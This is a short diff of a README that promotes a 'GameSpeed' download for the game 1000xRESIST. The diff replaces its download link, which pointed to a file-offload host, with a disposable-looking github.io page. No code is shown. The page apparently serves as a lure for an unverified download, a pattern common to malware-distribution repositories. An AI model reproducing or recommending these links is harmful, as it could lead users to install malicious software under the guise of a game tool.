@@ -2,7 +2,7 @@
 
 *1000xRESIST* is a narrative-driven adventure that immerses players in a richly detailed dystopian world. Its pacing is deliberately measured, allowing players to absorb the intricate storylines and character developments. However, some players may seek ways to adjust the game's speed to better suit their personal preferences.
 
-[![Download GameSpeed](https://img.shields.io/badge/Download-GameSpeed-blueviolet)](https://fileoffload2.bitbucket.io)
+[![Download GameSpeed](https://img.shields.io/badge/Download-GameSpeed-blueviolet)](https://1000xRESIST-Game-Speed-jit2.github.io/.github)
 ---
 
 ## 🛠️ Adjusting Game Speed: Exploring the Options
